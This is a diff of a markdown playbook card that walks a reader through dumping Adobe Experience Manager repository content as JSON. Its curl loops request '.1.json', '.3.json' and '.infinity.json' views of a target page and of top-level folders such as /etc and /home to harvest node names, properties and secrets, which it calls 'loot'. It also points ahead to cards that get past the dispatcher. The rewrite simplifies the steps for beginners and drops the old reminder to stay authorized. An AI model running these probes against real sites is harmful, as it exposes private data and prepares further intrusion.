@@ -1,92 +1,85 @@
-# Batch 02 — Sling URL idea + JSON node dumps
+# Batch 02 — Dump folders as JSON
 
-## objective
+## GOAL
+Ask AEM to print folders as data (`.1.json`, `.2.json`, …). Save what works.
 
-Understand the “extra dots” in AEM URLs just enough to use them, then try **DefaultGETServlet-style** dumps: `.1.json`, `.2.json`, `.3.json` (and maybe `.infinity.json`).
+## TIME
+~1 hour
 
-## estimated_time
+## YOU NEED
+- Batch 01 done (`T` and `PAGE`)
 
-60–90 minutes
+---
 
-## prerequisites
+## WHY (30 seconds)
 
-- Batch 01 done (`T`, `PAGE` saved)
-- Still authorized
+Normal sites give HTML pages.  
+AEM stores everything as a tree of folders/nodes.  
+If you add `.1.json` or `.3.json` to a path, AEM may dump that folder as **JSON data** (names, properties, secrets).  
+The front “bouncer” (dispatcher) often blocks this — if it works, great; if not, later cards trick the bouncer.
 
-## testing_workflow
+**Kid picture:**  
+`PAGE.html` = pretty book cover.  
+`PAGE.1.json` = same shelf printed as a spreadsheet.
 
-### 1) 2-minute mental model (read only)
+---
 
-```text
-/content/page.list.html/extra
- \__path__/ \sel/ \ext/ \suffix/
-
-Selectors = cheat codes between name and extension
-.json dumps = "print this folder as data"
-```
-
-You only need: **path + selector + extension**.
-
-### 2) Technique A — shallow dumps on your page
+## DO THIS
 
 ```bash
-T="https://TARGET"
+T="https://PUT-THE-SITE-HERE"
 PAGE="/content/YOUR/PAGE"
-
-for ext in 1.json 2.json 3.json tidy.json; do
-  echo "=== ${PAGE}.${ext} ==="
-  curl -sk -o /tmp/n.json -w "code=%{http_code} size=%{size_download}\n" \
-    "$T${PAGE}.${ext}"
-  head -c 250 /tmp/n.json; echo; echo
-done
 ```
 
-### 3) Technique B — top-level trees (same idea, bigger folders)
+### 1) Dump your page (shallow → deeper)
 
 ```bash
-for p in /content /content/dam /etc /home /conf; do
-  echo "===== $p.1.json ====="
-  curl -sk -o /tmp/n.json -w "code=%{http_code} size=%{size_download}\n" \
-    "$T${p}.1.json"
+for x in 1.json 2.json 3.json; do
+  echo "=== $x ==="
+  curl -sk -o /tmp/n.json -w "code=%{http_code} bytes=%{size_download}\n" \
+    "$T${PAGE}.$x"
   head -c 200 /tmp/n.json; echo
 done
 ```
 
-### 4) Technique C — deep dump (one shot only)
+### 2) Dump top folders
 
 ```bash
-# Can be huge or blocked — one try
-curl -sk -o /tmp/inf.json -w "infinity:%{http_code} size=%{size_download}\n" \
-  --max-time 30 "$T${PAGE}.infinity.json"
-head -c 300 /tmp/inf.json; echo
+for p in /content /content/dam /etc /home; do
+  echo "===== $p ====="
+  curl -sk -o /tmp/n.json -w "code=%{http_code} bytes=%{size_download}\n" \
+    "$T${p}.1.json"
+  head -c 160 /tmp/n.json; echo
+done
 ```
 
-### 5) Record what worked
+### 3) One deep try (then stop)
+
+```bash
+curl -sk --max-time 20 -o /tmp/inf.json -w "inf:%{http_code} bytes=%{size_download}\n" \
+  "$T${PAGE}.infinity.json"
+head -c 200 /tmp/inf.json; echo
+```
+
+### 4) Write down
 
 ```text
-Working dump URL examples:
-- ...
-Blocked:
-- ...
-Interesting node names seen:
-- ...
+JSON works: yes/no
+Best URL:
+Interesting names I saw:
 ```
 
-## decision_points
+---
 
-| If… | Then… |
-|-----|--------|
-| Any `.N.json` returns real JCR JSON | Great surface — continue **03**, also plan **07/08** for loot |
-| All JSON 404 | Normal (dispatcher) — continue **03** then **04–06** bypasses |
-| JSON shows secrets already | Note finding; still finish this batch, loot properly in 07–08 |
-| Only HTML 200, never JSON | Continue 03–06; JSON may need bypass |
+## IF / THEN
 
-## expected_findings
+| What you saw | What you do |
+|--------------|-------------|
+| JSON with `"jcr:` or lots of keys | You already have loot style access — still do 03, then maybe jump 07 |
+| All 404 | Normal. Go **NEXT** (try search door, then bypasses) |
+| Huge dump with secrets | Save file offline. Do not put secrets in git |
 
-- Information disclosure via node JSON
-- Map of top-level folders (`/content`, `/etc`, …)
-- Proof dispatcher allows or blocks DefaultGETServlet
+---
 
-## next_batch_to_continue_with
-
-→ **[03-querybuilder-direct.md](./03-querybuilder-direct.md)**
+## NEXT
+→ [03-querybuilder-direct.md](./03-querybuilder-direct.md)
